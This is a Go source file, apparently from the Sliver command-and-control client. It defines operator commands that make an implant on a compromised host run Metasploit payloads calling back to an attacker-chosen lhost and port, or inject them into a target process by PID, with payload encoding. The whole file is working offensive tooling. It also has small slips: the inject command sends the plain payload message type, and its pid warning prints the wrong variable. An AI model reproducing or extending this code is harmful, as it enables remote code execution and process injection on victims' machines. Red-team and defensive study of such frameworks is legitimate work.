package command

import (
	"fmt"
	consts "sliver/client/constants"
	pb "sliver/protobuf/client"

	"sliver/client/spin"

	"github.com/desertbit/grumble"
	"github.com/golang/protobuf/proto"
)

func msf(ctx *grumble.Context, rpc RPCServer) {

	payloadName := ctx.Flags.String("payload")
	lhost := ctx.Flags.String("lhost")
	lport := ctx.Flags.Int("lport")
	encoder := ctx.Flags.String("encoder")
	iterations := ctx.Flags.Int("iterations")

	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if lhost == "" {
		fmt.Printf(Warn+"Invalid lhost '%s', see `help %s`\n", lhost, consts.MsfStr)
		return
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Sending payload %s %s/%s -> %s:%d ...",
		payloadName, activeSliver.OS, activeSliver.Arch, lhost, lport)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&pb.MSFReq{
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      int32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		SliverID:   ActiveSliver.Sliver.ID,
	})
	resp := rpc(&pb.Envelope{
		Type: consts.MsfStr,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	if resp.Error != "" {
		fmt.Printf(Warn+"%s\n", resp.Error)
		return
	}

	fmt.Printf(Info + "Executed payload on target\n")
}

func msfInject(ctx *grumble.Context, rpc RPCServer) {
	payloadName := ctx.Flags.String("payload")
	lhost := ctx.Flags.String("lhost")
	lport := ctx.Flags.Int("lport")
	encoder := ctx.Flags.String("encoder")
	iterations := ctx.Flags.Int("iterations")
	pid := ctx.Flags.Int("pid")

	activeSliver := ActiveSliver.Sliver
	if activeSliver == nil {
		fmt.Printf(Warn + "Please select an active sliver via `use`\n")
		return
	}

	if lhost == "" {
		fmt.Printf(Warn+"Invalid lhost '%s', see `help %s`\n", lhost, consts.InjectStr)
		return
	}

	if pid == -1 {
		fmt.Printf(Warn+"Invalid pid '%s', see `help %s`\n", lhost, consts.InjectStr)
		return
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
		payloadName, activeSliver.OS, activeSliver.Arch, lhost, lport)
	go spin.Until(msg, ctrl)
	data, _ := proto.Marshal(&pb.MSFInjectReq{
		Payload:    payloadName,
		LHost:      lhost,
		LPort:      int32(lport),
		Encoder:    encoder,
		Iterations: int32(iterations),
		PID:        int32(pid),
		SliverID:   ActiveSliver.Sliver.ID,
	})
	resp := rpc(&pb.Envelope{
		Type: consts.MsfStr,
		Data: data,
	}, defaultTimeout)
	ctrl <- true
	if resp.Error != "" {
		fmt.Printf(Warn+"%s\n", resp.Error)
		return
	}

	fmt.Printf(Info + "Executed payload on target\n")
}
